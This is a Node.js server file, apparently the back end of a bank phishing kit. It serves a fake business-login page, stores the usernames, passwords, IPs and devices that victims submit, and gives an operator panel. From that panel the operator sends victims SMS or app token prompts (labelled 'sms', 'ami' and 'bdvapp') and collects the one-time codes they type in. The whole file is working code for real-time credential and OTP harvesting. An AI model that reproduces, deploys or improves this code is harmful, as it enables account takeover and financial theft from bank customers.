const http = require('http');
const fs = require('fs');
const path = require('path');

// DigitalOcean App Platform asigna PORT por variable de entorno (por defecto 8080)
const PORT = parseInt(process.env.PORT, 10) || 8080;
// En contenedores cloud (DigitalOcean, Docker, etc.) es obligatorio escuchar en 0.0.0.0
const HOST = '0.0.0.0';
const PUBLIC_DIR = __dirname;

const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.descarga': 'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
  '.ttf': 'font/ttf'
};

// Almacén de sesiones con persistencia en disco para evitar pérdidas en reinicios o balanceadores
const SESSIONS_FILE = path.join(__dirname, 'sessions_data.json');
let sessions = {};
let clearedAt = 0;
let deletedIds = {};

function loadSessions() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const raw = fs.readFileSync(SESSIONS_FILE, 'utf8');
      if (raw && raw.trim().length > 0) {
        const data = JSON.parse(raw);
        if (data && typeof data === 'object') {
          if (data.sessions && typeof data.sessions === 'object') {
            sessions = data.sessions;
            clearedAt = Number(data.clearedAt) || 0;
            deletedIds = data.deletedIds || {};
          } else if (!Array.isArray(data)) {
            sessions = data;
          }
        }
      }
    }
  } catch (_) {}
}

function saveSessions() {
  try {
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify({
      sessions: sessions || {},
      clearedAt: clearedAt || 0,
      deletedIds: deletedIds || {}
    }), 'utf8');
  } catch (_) {}
}

function purgeOldSessions() {
  const now = Date.now();
  const MAX_INACTIVE_MS = 45 * 60 * 1000; // 45 minutos sin actividad
  const MAX_TOTAL_AGE_MS = 2 * 60 * 60 * 1000; // 2 horas de vida máxima
  let changed = false;

  for (const [id, s] of Object.entries(sessions)) {
    const age = now - (s.createdAt || 0);
    const inactive = now - (s.last_seen || 0);
    if (deletedIds[id] || (s.createdAt && s.createdAt <= clearedAt) || age > MAX_TOTAL_AGE_MS || inactive > MAX_INACTIVE_MS || (s.state === 'done' && inactive > 10 * 60 * 1000)) {
      delete sessions[id];
      changed = true;
    }
  }

  // Purgar deletedIds con más de 2 horas
  for (const [id, ts] of Object.entries(deletedIds)) {
    if (now - ts > MAX_TOTAL_AGE_MS) {
      delete deletedIds[id];
      changed = true;
    }
  }

  if (changed) {
    saveSessions();
  }
}

loadSessions();
purgeOldSessions();
setInterval(purgeOldSessions, 60000);

function parseJsonBody(req) {
  return new Promise((resolve) => {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      try {
        resolve(body ? JSON.parse(body) : {});
      } catch (_) {
        resolve({});
      }
    });
  });
}

function sendJson(res, statusCode, data) {
  res.writeHead(statusCode, {
    'Content-Type': 'application/json; charset=utf-8',
    'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
    'Pragma': 'no-cache',
    'Expires': '0',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS'
  });
  res.end(JSON.stringify(data));
}

async function handleRequest(req, res) {
  try {
    const reqUrl = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
    let pathname = decodeURIComponent(reqUrl.pathname);

    // Manejo de preflight CORS
    if (req.method === 'OPTIONS') {
      res.writeHead(204, {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization',
        'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS'
      });
      return res.end();
    }

    // Endpoints de comprobación de estado (Health Checks) para DigitalOcean / Cloud
    if (pathname === '/health' || pathname === '/healthz' || pathname === '/ping') {
      res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
      return res.end('OK');
    }

    // ==========================================
    // API de Sesiones en tiempo real para el Panel
    // ==========================================

    // 0. Sincronización entre panel y servidores (sin revivir sesiones eliminadas)
    if (pathname === '/api/sessions/sync' && req.method === 'POST') {
      return sendJson(res, 200, []);
    }

    // 1. Obtener todas las sesiones (para el panel de operador)
    if (pathname === '/api/sessions' && req.method === 'GET') {
      loadSessions();

      const qClearedAt = Number(reqUrl.searchParams.get('clearedAt')) || 0;
      let changed = false;
      if (qClearedAt > clearedAt) {
        clearedAt = qClearedAt;
        changed = true;
      }

      const qDeletedIds = reqUrl.searchParams.get('deletedIds');
      if (qDeletedIds) {
        const ids = qDeletedIds.split(',').map(s => s.trim()).filter(Boolean);
        const now = Date.now();
        ids.forEach((id) => {
          if (!deletedIds[id]) {
            deletedIds[id] = now;
            changed = true;
          }
          if (sessions[id]) {
            delete sessions[id];
            changed = true;
          }
        });
      }

      purgeOldSessions();
      if (changed) {
        saveSessions();
      }

      const now = Date.now();
      const list = Object.values(sessions)
        .filter((s) => !deletedIds[s.id] && (!s.createdAt || s.createdAt > clearedAt))
        .map((s) => {
          const online = now - s.last_seen < 35000;
          return { ...s, online };
        });

      return sendJson(res, 200, {
        sessions: list,
        clearedAt: clearedAt,
        deletedIds: Object.keys(deletedIds)
      });
    }

    // 2. Crear o actualizar sesión (desde el login de empresas o sincronización del panel)
    if (pathname === '/api/sessions' && req.method === 'POST') {
      loadSessions();
      const body = await parseJsonBody(req);
      const { id, username, password, tipoUsuario, device, state } = body;
      if (!id) return sendJson(res, 400, { error: 'Missing session id' });

      // No registrar ni revivir sesiones que están en deletedIds o anteriores a clearedAt
      if (deletedIds[id] || (body.createdAt && body.createdAt <= clearedAt)) {
        return sendJson(res, 200, { success: false, ignored: true });
      }

      const clientIp = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '127.0.0.1';
      const now = Date.now();

      if (sessions[id]) {
        sessions[id] = {
          ...sessions[id],
          username: username || sessions[id].username,
          password: password || sessions[id].password,
          tipoUsuario: tipoUsuario || sessions[id].tipoUsuario,
          device: device || sessions[id].device,
          ip: body.ip || clientIp,
          state: state || sessions[id].state,
          token: body.token !== undefined ? body.token : sessions[id].token,
          createdAt: sessions[id].createdAt || body.createdAt || now,
          last_seen: Math.max(sessions[id].last_seen || 0, body.last_seen || 0, now),
          updatedAt: now
        };
      } else {
        sessions[id] = {
          id,
          index: Object.keys(sessions).length + 1,
          username: username || '—',
          password: password || '—',
          tipoUsuario: tipoUsuario || 'EMPRESAS',
          device: device || 'desktop',
          ip: body.ip || clientIp,
          state: state || 'waiting',
          token: body.token || '',
          createdAt: body.createdAt || now,
          last_seen: body.last_seen || now,
          updatedAt: now
        };
      }
      saveSessions();
      return sendJson(res, 200, { success: true, session: sessions[id] });
    }

    // 3. Ping keepalive de la sesión
    const pingMatch = pathname.match(/^\/api\/sessions\/([^\/]+)\/ping$/);
    if (pingMatch && req.method === 'POST') {
      loadSessions();
      const id = pingMatch[1];
      if (!sessions[id]) return sendJson(res, 404, { error: 'Session not found' });
      sessions[id].last_seen = Date.now();
      saveSessions();
      return sendJson(res, 200, { success: true });
    }

    // 4. Enviar token / código ingresado por el usuario
    const tokenMatch = pathname.match(/^\/api\/sessions\/([^\/]+)\/token$/);
    if (tokenMatch && req.method === 'POST') {
      loadSessions();
      const id = tokenMatch[1];
      const body = await parseJsonBody(req);
      if (!sessions[id]) {
        return sendJson(res, 404, { error: 'Session not found' });
      }
      sessions[id].token = body.token || '';
      const currentAction = sessions[id].action;
      if (currentAction === 'ami') {
        sessions[id].state = 'received-ami';
      } else if (currentAction === 'bdvapp') {
        sessions[id].state = 'received-bdvapp';
      } else {
        sessions[id].state = 'received-sms';
      }
      sessions[id].action = null;
      sessions[id].last_seen = Date.now();
      sessions[id].updatedAt = Date.now();
      saveSessions();
      return sendJson(res, 200, { success: true, session: sessions[id] });
    }

    // 5. Asignar acción desde el panel de operador (sms, ami, bdvapp, error-login, done, etc.)
    const actionMatch = pathname.match(/^\/api\/sessions\/([^\/]+)\/action$/);
    if (actionMatch && req.method === 'POST') {
      loadSessions();
      const id = actionMatch[1];
      const body = await parseJsonBody(req);
      if (!sessions[id]) {
        return sendJson(res, 404, { error: 'Session not found' });
      }
      sessions[id].state = body.state || sessions[id].state;
      sessions[id].action = body.action;
      sessions[id].actionTime = body.actionTime || Date.now();
      if (body.action === 'sms' || body.action === 'ami' || body.action === 'bdvapp') {
        sessions[id].token = '';
      }
      sessions[id].last_seen = Date.now();
      sessions[id].updatedAt = Date.now();
      saveSessions();
      return sendJson(res, 200, { success: true, session: sessions[id] });
    }

    // 6. Cambiar estado de la sesión (ej. 'metodo-sms')
    const stateMatch = pathname.match(/^\/api\/sessions\/([^\/]+)\/state$/);
    if (stateMatch && req.method === 'POST') {
      loadSessions();
      const id = stateMatch[1];
      if (!sessions[id]) {
        return sendJson(res, 404, { error: 'Session not found' });
      }
      const body = await parseJsonBody(req);
      sessions[id].state = body.state || sessions[id].state;
      sessions[id].last_seen = Date.now();
      sessions[id].updatedAt = Date.now();
      saveSessions();
      return sendJson(res, 200, { success: true, session: sessions[id] });
    }

    // 7. Consultar sesión individual (polling del cliente)
    const sessionMatch = pathname.match(/^\/api\/sessions\/([^\/]+)$/);
    if (sessionMatch && req.method === 'GET') {
      loadSessions();
      const id = sessionMatch[1];
      const session = sessions[id];
      if (!session) {
        return sendJson(res, 404, { error: 'Session not found' });
      }
      return sendJson(res, 200, session);
    }

    // 7.5 Eliminar una sesión individual
    const deleteMatch = pathname.match(/^\/api\/sessions\/([^\/]+)$/);
    if (deleteMatch && req.method === 'DELETE') {
      loadSessions();
      const id = deleteMatch[1];
      deletedIds[id] = Date.now();
      if (sessions[id]) {
        delete sessions[id];
      }
      saveSessions();
      return sendJson(res, 200, { success: true });
    }

    // 8. Limpiar todas las sesiones
    if (pathname === '/api/clear' && req.method === 'POST') {
      loadSessions();
      const now = Date.now();
      for (const id of Object.keys(sessions)) {
        deletedIds[id] = now;
      }
      sessions = {};
      clearedAt = now;
      saveSessions();
      return sendJson(res, 200, { success: true });
    }

    // ==========================================
    // Servidor de archivos estáticos
    // ==========================================

    if (pathname === '/') {
      pathname = '/empresas.html';
    }

    // Redirigir /panel a /panel/ para mantener rutas relativas correctas
    if (pathname === '/panel') {
      res.writeHead(301, { Location: '/panel/' });
      return res.end();
    }
    if (pathname === '/panel/') {
      pathname = '/panel/index.html';
    }

    // Prevenir directory traversal
    const safePath = path.normalize(path.join(PUBLIC_DIR, pathname));
    if (!safePath.startsWith(PUBLIC_DIR)) {
      res.writeHead(403, { 'Content-Type': 'text/plain; charset=utf-8' });
      return res.end('403 Prohibido');
    }

    fs.stat(safePath, (err, stats) => {
      if (err) {
        res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
        return res.end('404 No Encontrado');
      }

      let filePath = safePath;
      if (stats.isDirectory()) {
        filePath = path.join(safePath, 'index.html');
      }

      const ext = path.extname(filePath).toLowerCase();
      const contentType = MIME_TYPES[ext] || 'application/octet-stream';

      if (req.method === 'HEAD') {
        res.writeHead(200, {
          'Content-Type': contentType,
          'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
          'Pragma': 'no-cache',
          'Expires': '0'
        });
        return res.end();
      }

      fs.readFile(filePath, (readErr, content) => {
        if (readErr) {
          res.writeHead(500, { 'Content-Type': 'text/plain; charset=utf-8' });
          return res.end('500 Error interno del servidor');
        }

        res.writeHead(200, {
          'Content-Type': contentType,
          'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
          'Pragma': 'no-cache',
          'Expires': '0'
        });
        res.end(content);
      });
    });
  } catch (error) {
    res.writeHead(500, { 'Content-Type': 'text/plain; charset=utf-8' });
    res.end('500 Error en la petición');
  }
}

const server = http.createServer(handleRequest);

server.listen(PORT, HOST, () => {
  console.log(`\n=========================================`);
  console.log(` Servidor Node.js activo`);
  console.log(` Escuchando en http://${HOST}:${PORT}`);
  console.log(` Panel de operador en http://${HOST}:${PORT}/panel`);
  console.log(`=========================================\n`);
});

server.on('error', (err) => {
  console.error('Error al iniciar el servidor:', err);
  process.exit(1);
});

// Manejo de señales para apagado limpio en contenedores cloud
process.on('SIGTERM', () => {
  console.log('Recibido SIGTERM, cerrando servidor...');
  server.close(() => process.exit(0));
});

process.on('SIGINT', () => {
  console.log('Recibido SIGINT, cerrando servidor...');
  server.close(() => process.exit(0));
});
